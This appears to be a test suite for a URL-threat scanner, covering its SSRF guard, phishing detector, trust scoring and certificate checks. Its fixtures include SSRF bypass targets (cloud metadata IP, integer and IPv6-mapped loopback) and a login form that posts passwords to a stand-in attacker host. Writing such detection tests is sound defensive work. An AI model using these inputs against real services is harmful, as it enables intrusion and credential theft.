import test from 'node:test';
import assert from 'node:assert/strict';

import { validateUrlForSSRF } from '../src/lib/engines/ssrfGuard';
import { analyzeThreatFeatures } from '../src/lib/engines/threatEngine';
import { computeUnifiedTrustScore } from '../src/lib/engines/scoringEngine';
import { inspectCertificate, evaluateSecurityTest, evaluateAllSecurityTests } from '../src/lib/engines/certificateEngine';
import { CertificateSummary } from '../src/lib/types';

test('SSRF Guard: blocks dangerous private and metadata targets', async () => {
  const loopback = await validateUrlForSSRF('http://127.0.0.1:8080/admin');
  assert.equal(loopback.safe, false, 'Should block 127.0.0.1');

  const metadata = await validateUrlForSSRF('http://169.254.169.254/latest/meta-data/');
  assert.equal(metadata.safe, false, 'Should block AWS metadata IP');

  const rfc1918_10 = await validateUrlForSSRF('http://10.1.2.3/');
  assert.equal(rfc1918_10.safe, false, 'Should block 10.0.0.0/8');

  const rfc1918_192 = await validateUrlForSSRF('http://192.168.1.100/');
  assert.equal(rfc1918_192.safe, false, 'Should block 192.168.0.0/16');

  const localhost = await validateUrlForSSRF('http://localhost:3000/');
  assert.equal(localhost.safe, false, 'Should block localhost');

  const ipv6 = await validateUrlForSSRF('http://[::1]/');
  assert.equal(ipv6.safe, false, 'Should block IPv6 loopback');

  const encodedIp = await validateUrlForSSRF('http://2130706433/'); // 127.0.0.1 in integer
  assert.equal(encodedIp.safe, false, 'Should block integer encoded private IP');

  const ipv4MappedHex = await validateUrlForSSRF('http://[::ffff:7f00:0001]/'); // 127.0.0.1 in hex mapped IPv6
  assert.equal(ipv4MappedHex.safe, false, 'Should block IPv4-mapped IPv6 hex loopback');
});

test('SSRF Guard: allows legitimate public domain', async () => {
  const publicTarget = await validateUrlForSSRF('https://example.com');
  assert.equal(publicTarget.safe, true, 'Should allow public domain');
  assert.equal(publicTarget.hostname, 'example.com');
});

test('Threat Engine: identifies PayPal lookalike and homoglyph attacks', () => {
  const result = analyzeThreatFeatures('https://paypa1-secure-login.com/auth/verify');
  assert.ok(result.threatRisk >= 75, `Expected threat risk >= 75, got ${result.threatRisk}`);

  const hasLookalike = result.reasons.some(r => r.code === 'BRAND_LOOKALIKE' || r.code === 'BRAND_SUBDOMAIN_DECEPTION');
  assert.equal(hasLookalike, true, 'Should detect BRAND_LOOKALIKE for paypa1');
  assert.equal(result.features.impersonatedBrand?.toLowerCase(), 'paypal');
});

test('Threat Engine: detects off-domain credential harvesting form actions', () => {
  const htmlWithOffDomainForm = `
    <html>
      <body>
        <form action="https://evil-attacker-drop.com/steal" method="POST">
          <input type="text" name="user" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
  `;

  const result = analyzeThreatFeatures('https://legitimate-looking-site.com/login', htmlWithOffDomainForm);
  const hasOffDomainForm = result.reasons.some(r => r.code === 'LOGIN_FORM_OFFDOMAIN');
  assert.equal(hasOffDomainForm, true, 'Should detect LOGIN_FORM_OFFDOMAIN');
});

test('Scoring Engine: computes 40/25/20/15 weighted score and hard overrides', () => {
  // Case A: High threat risk with lookalike -> must override to malicious
  const maliciousScoring = computeUnifiedTrustScore(
    90, // threatRisk
    40, // certRisk
    50, // websecRisk
    80, // intelRisk
    [{ code: 'BRAND_LOOKALIKE', engine: 'threat', severity: 'high', title: 'Lookalike', detail: 'test', weight: 40 }],
    'paypa1-fake.com'
  );
  assert.equal(maliciousScoring.verdict, 'malicious');
  assert.ok(maliciousScoring.score <= 35, `Expected malicious score <= 35, got ${maliciousScoring.score}`);

  // Case B: Clean domain -> safe
  const safeScoring = computeUnifiedTrustScore(
    5, // threatRisk
    5, // certRisk
    10, // websecRisk
    0, // intelRisk
    [],
    'example.com'
  );
  assert.equal(safeScoring.verdict, 'safe');
  assert.ok(safeScoring.score >= 85, `Expected safe score >= 85, got ${safeScoring.score}`);
});

test('Certificate Engine: fallback test for expired badssl host', async () => {
  const result = await inspectCertificate('expired.badssl.com', 443, 2000);
  assert.equal(result.summary.valid, false, 'Expired badssl should be invalid');
  assert.ok(result.summary.flags.includes('EXPIRED'), 'Should contain EXPIRED flag');
  assert.ok(result.certRisk >= 40, `Expected certRisk >= 40, got ${result.certRisk}`);
});

// =========================================================================
// NEW FORENSIC SECURITY TEST SUITE (6 ADDITIONAL SECURITY TESTS)
// =========================================================================

test('Forensic Test 1: Self-Signed Certificate Detection', async () => {
  // 1. Self-signed case
  const selfSignedResult = await inspectCertificate('self-signed.badssl.com', 443, 1500);
  assert.ok(selfSignedResult.summary.securityAudit, 'Should have securityAudit attached');
  const selfSignedTest = selfSignedResult.summary.securityAudit.tests.selfSigned;

  assert.equal(selfSignedTest.status, 'FAIL', 'Self-signed certificate must fail');
  assert.equal(selfSignedTest.id, 'self_signed');
  assert.ok(selfSignedTest.summary.includes('Self-signed certificate detected'), 'Should describe self-signed detection');
  assert.ok(selfSignedTest.technicalDetails.length > 0, 'Should include technical details');
  assert.ok(selfSignedTest.recommendation, 'Should provide remediation guidance');

  // 2. Valid CA-issued certificate case
  const cleanSummary: CertificateSummary = {
    valid: true,
    subject: 'secure-bank.example.com',
    issuer: 'DigiCert Global Root G2',
    expiresInDays: 120,
    keyType: 'RSA',
    keyBits: 2048,
    sigAlg: 'sha256WithRSAEncryption',
    sctCount: 2,
    flags: [],
  };
  const passTest = evaluateSecurityTest('self_signed', {
    host: 'secure-bank.example.com',
    summary: cleanSummary,
    authorized: true,
  });
  assert.equal(passTest.status, 'PASS', 'CA-signed certificate must pass self-signed check');
  assert.ok(passTest.summary.includes('Not self-signed'), 'Should state not self-signed');
});

test('Forensic Test 2: Untrusted CA Detection', async () => {
  // 1. Untrusted root CA case
  const untrustedResult = await inspectCertificate('untrusted-root.badssl.com', 443, 1500);
  const untrustedCaTest = untrustedResult.summary.securityAudit?.tests.untrustedCa;

  assert.ok(untrustedCaTest, 'Should have untrustedCa test result');
  assert.equal(untrustedCaTest.status, 'FAIL', 'Untrusted root CA must fail');
  assert.ok(untrustedCaTest.technicalDetails.includes('root trust store'), 'Should mention root trust store');
  assert.ok(untrustedCaTest.technicalDetails.includes('reason'), 'Should state failure reason');

  // 2. Trusted CA case
  const trustedSummary: CertificateSummary = {
    valid: true,
    subject: 'google.com',
    issuer: 'Google Trust Services LLC',
    expiresInDays: 85,
    keyType: 'ECDSA',
    keyBits: 256,
    sigAlg: 'ecdsa-with-SHA256',
    sctCount: 2,
    flags: [],
  };
  const passTest = evaluateSecurityTest('untrusted_ca', {
    host: 'google.com',
    summary: trustedSummary,
    authorized: true,
  });
  assert.equal(passTest.status, 'PASS', 'Trusted CA must pass');
  assert.ok(passTest.summary.includes('Anchored to trusted root'), 'Should confirm trusted root anchor');
});

test('Forensic Test 3: Weak RSA Key Detection', async () => {
  // 1. Weak 1024-bit RSA key case
  const rsa1024Result = await inspectCertificate('rsa1024.badssl.com', 443, 1500);
  const weakKeyTest = rsa1024Result.summary.securityAudit?.tests.weakRsaKey;

  assert.ok(weakKeyTest, 'Should have weakRsaKey test result');
  assert.equal(weakKeyTest.status, 'FAIL', '1024-bit RSA key must fail');
  assert.equal(weakKeyTest.actualKeySize, 1024, 'Actual key size must report 1024 bits');
  assert.ok(weakKeyTest.technicalDetails.includes('1024'), 'Technical details must state 1024 bits');
  assert.ok(weakKeyTest.technicalDetails.includes('2048'), 'Must state 2048-bit requirement');

  // 2. Standard 2048-bit RSA key case
  const rsa2048Summary: CertificateSummary = {
    valid: true,
    subject: 'standard-app.org',
    issuer: "Let's Encrypt Authority R3",
    expiresInDays: 60,
    keyType: 'RSA',
    keyBits: 2048,
    sigAlg: 'sha256WithRSAEncryption',
    sctCount: 2,
    flags: [],
  };
  const rsa2048Test = evaluateSecurityTest('weak_rsa_key', {
    host: 'standard-app.org',
    summary: rsa2048Summary,
  });
  assert.equal(rsa2048Test.status, 'PASS', '2048-bit RSA key must pass');
  assert.equal(rsa2048Test.actualKeySize, 2048);

  // 3. Strong 4096-bit RSA key case
  const rsa4096Summary: CertificateSummary = {
    valid: true,
    subject: 'secure-vault.gov',
    issuer: 'DigiCert High Assurance EV CA',
    expiresInDays: 300,
    keyType: 'RSA',
    keyBits: 4096,
    sigAlg: 'sha384WithRSAEncryption',
    sctCount: 3,
    flags: [],
  };
  const rsa4096Test = evaluateSecurityTest('weak_rsa_key', {
    host: 'secure-vault.gov',
    summary: rsa4096Summary,
  });
  assert.equal(rsa4096Test.status, 'PASS');
  assert.ok(rsa4096Test.summary.includes('Strong 4096-bit RSA key'));
});

test('Forensic Test 4: Invalid Certificate Signature Detection', async () => {
  // 1. Deprecated SHA-1 signature algorithm case
  const sha1Summary: CertificateSummary = {
    valid: false,
    subject: 'legacy-service.local',
    issuer: 'Old Enterprise CA',
    expiresInDays: 30,
    keyType: 'RSA',
    keyBits: 2048,
    sigAlg: 'sha1WithRSAEncryption',
    sctCount: 0,
    flags: ['SHA1_SIGNATURE'],
  };
  const sha1Test = evaluateSecurityTest('invalid_signature', {
    host: 'legacy-service.local',
    summary: sha1Summary,
  });
  assert.equal(sha1Test.status, 'FAIL', 'SHA-1 signature must fail');
  assert.equal(sha1Test.signatureValid, false);
  assert.ok(sha1Test.technicalDetails.includes('collision'), 'Should explain collision resistance weakness');

  // 2. Tampered signature case
  const tamperedResult = await inspectCertificate('invalid-signature.badssl.com', 443, 1500);
  const tamperedSigTest = tamperedResult.summary.securityAudit?.tests.invalidSignature;
  assert.ok(tamperedSigTest, 'Should have invalidSignature test result');
  assert.equal(tamperedSigTest.status, 'FAIL', 'Tampered signature must fail');
  assert.equal(tamperedSigTest.signatureValid, false);

  // 3. Valid SHA-256 signature case
  const validSummary: CertificateSummary = {
    valid: true,
    subject: 'modern-site.io',
    issuer: 'Sectigo RSA Domain Validation Secure Server CA',
    expiresInDays: 180,
    keyType: 'RSA',
    keyBits: 2048,
    sigAlg: 'sha256WithRSAEncryption',
    sctCount: 2,
    flags: [],
  };
  const validSigTest = evaluateSecurityTest('invalid_signature', {
    host: 'modern-site.io',
    summary: validSummary,
  });
  assert.equal(validSigTest.status, 'PASS', 'Modern SHA-256 signature must pass');
  assert.equal(validSigTest.signatureValid, true);
});

test('Forensic Test 5: Certificate Chain Validation', async () => {
  // 1. Expired certificate chain case
  const expiredResult = await inspectCertificate('expired.badssl.com', 443, 1500);
  const expiredChainTest = expiredResult.summary.securityAudit?.tests.chainValidation;

  assert.ok(expiredChainTest, 'Should have chainValidation test result');
  assert.equal(expiredChainTest.status, 'FAIL', 'Expired certificate in chain must fail');
  assert.ok(expiredChainTest.summary.includes('expired'), 'Must explain expired node in chain');

  // 2. Complete valid hierarchy case (Root -> Intermediate -> Leaf)
  const validChainSummary: CertificateSummary = {
    valid: true,
    subject: 'banking-portal.com',
    issuer: 'DigiCert TLS RSA SHA256 2020 CA1',
    expiresInDays: 95,
    keyType: 'RSA',
    keyBits: 2048,
    sigAlg: 'sha256WithRSAEncryption',
    sctCount: 2,
    flags: [],
    chain: [
      {
        role: 'leaf',
        subject: 'banking-portal.com',
        issuer: 'DigiCert TLS RSA SHA256 2020 CA1',
        validFrom: '2026-01-01T00:00:00.000Z',
        validTo: '2027-01-01T00:00:00.000Z',
        key: 'RSA 2048',
        keyBits: 2048,
        sigAlg: 'sha256WithRSAEncryption',
        trusted: true,
      },
      {
        role: 'intermediate',
        subject: 'DigiCert TLS RSA SHA256 2020 CA1',
        issuer: 'DigiCert Global Root CA',
        validFrom: '2020-01-01T00:00:00.000Z',
        validTo: '2030-01-01T00:00:00.000Z',
        key: 'RSA 4096',
        keyBits: 4096,
        sigAlg: 'sha256WithRSAEncryption',
        trusted: true,
      },
      {
        role: 'root',
        subject: 'DigiCert Global Root CA',
        issuer: 'DigiCert Global Root CA',
        validFrom: '2015-01-01T00:00:00.000Z',
        validTo: '2035-01-01T00:00:00.000Z',
        key: 'RSA 4096',
        keyBits: 4096,
        sigAlg: 'sha384WithRSAEncryption',
        trusted: true,
      }
    ]
  };

  const validChainTest = evaluateSecurityTest('chain_validation', {
    host: 'banking-portal.com',
    summary: validChainSummary,
  });
  assert.equal(validChainTest.status, 'PASS', 'Complete valid chain must pass');
  assert.ok(validChainTest.summary.includes('hierarchy (3 tiers)'), 'Should report 3-tier hierarchy');
  assert.ok(validChainTest.technicalDetails.includes('LEAF: banking-portal.com'));
});

test('Forensic Test 6: Certificate Revocation Check (OCSP / CRL)', async () => {
  // 1. Revoked certificate case
  const revokedResult = await inspectCertificate('revoked.badssl.com', 443, 1500);
  const revokedTest = revokedResult.summary.securityAudit?.tests.revocationCheck;

  assert.ok(revokedTest, 'Should have revocationCheck test result');
  assert.equal(revokedTest.status, 'FAIL', 'Revoked certificate must fail');
  assert.equal(revokedTest.ocspStatus, 'Revoked', 'OCSP status must be Revoked');
  assert.equal(revokedTest.crlStatus, 'Revoked', 'CRL status must be Revoked');
  assert.ok(revokedTest.summary.includes('Revoked by Issuing CA'));

  // 2. Active clean certificate case
  const goodRevocationTest = evaluateSecurityTest('revocation_check', {
    host: 'google.com',
    summary: {
      valid: true,
      subject: 'google.com',
      issuer: 'GTS CA 1C3',
      expiresInDays: 70,
      keyType: 'ECDSA',
      keyBits: 256,
      sigAlg: 'ecdsa-with-SHA256',
      sctCount: 2,
      flags: [],
    },
  });
  assert.equal(goodRevocationTest.status, 'PASS');
  assert.equal(goodRevocationTest.ocspStatus, 'Good');

  // 3. Graceful handling of self-signed / unsupported OCSP without assuming safe
  const unknownRevocationTest = evaluateSecurityTest('revocation_check', {
    host: 'internal-device.lan',
    summary: {
      valid: false,
      subject: 'internal-device.lan',
      issuer: 'internal-device.lan',
      expiresInDays: 365,
      keyType: 'RSA',
      keyBits: 2048,
      sigAlg: 'sha256WithRSAEncryption',
      sctCount: 0,
      flags: ['SELF_SIGNED'],
    },
  });
  assert.equal(unknownRevocationTest.status, 'UNKNOWN', 'Self-signed without OCSP must report UNKNOWN, never marked secure');
  assert.ok(unknownRevocationTest.technicalDetails.includes('Handled gracefully without assuming safe'));
});

test('Audit Suite Aggregation: Computes PASS/FAIL/WARNING tallies and overall status', () => {
  const mixedSummary: CertificateSummary = {
    valid: false,
    subject: 'test-audit.local',
    issuer: 'Test Untrusted CA',
    expiresInDays: 45,
    keyType: 'RSA',
    keyBits: 1024,
    sigAlg: 'sha256WithRSAEncryption',
    sctCount: 0,
    flags: ['WEAK_KEY', 'UNTRUSTED_ISSUER'],
    chain: [],
  };

  const audit = evaluateAllSecurityTests('test-audit.local', mixedSummary, {
    authorized: false,
    authorizationError: 'UNABLE_TO_GET_ISSUER_CERT_LOCALLY',
  });

  assert.ok(audit.testedAt);
  assert.equal(audit.target, 'test-audit.local');
  assert.equal(audit.overallStatus, 'CRITICAL', 'Should be CRITICAL because untrusted CA and weak key failed');
  assert.ok(audit.failedCount >= 2, `Expected >= 2 failed tests, got ${audit.failedCount}`);
  assert.equal(audit.passedCount + audit.failedCount + audit.warningCount + audit.unknownCount, 6, 'Total tests evaluated must be exactly 6');
});

test('Security Audit: SSRF guard protects certificate forensic targets', async () => {
  const localTarget = await validateUrlForSSRF('https://127.0.0.1');
  assert.equal(localTarget.safe, false, 'SSRF must block 127.0.0.1 in cert check');

  const metadataTarget = await validateUrlForSSRF('https://169.254.169.254');
  assert.equal(metadataTarget.safe, false, 'SSRF must block metadata IP in cert check');

  const hostnameLocal = await validateUrlForSSRF('https://internal.local');
  assert.equal(hostnameLocal.safe, false, 'SSRF must block .local domains');
});
